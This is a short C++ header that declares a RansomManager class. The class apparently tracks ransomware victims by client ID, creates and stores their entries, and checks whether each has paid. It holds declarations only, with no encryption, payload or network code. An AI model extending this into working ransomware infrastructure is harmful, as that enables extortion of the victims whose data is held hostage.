#pragma once
#include <map>

#include "RansomEntry.h"

class RansomManager
{
private:
	std::map<std::uint64_t, RansomEntry> entryCache_;
	CryptoPP::AutoSeededRandomPool& rng_;

public:
	class EntryNotFound : public std::exception {};
	class EntryLoadingError : public std::exception {};
	class EntrySavingError : public std::exception {};

public:
	RansomManager(CryptoPP::AutoSeededRandomPool& rng);
	RansomEntry getEntry(std::uint64_t clientId);
	RansomEntry createEntry();

private:
	RansomEntry loadEntry(std::uint64_t clientId);
	void saveEntry(RansomEntry& ransomEntry);
	void refreshPaymentStatus(RansomEntry& ransomEntry);
};

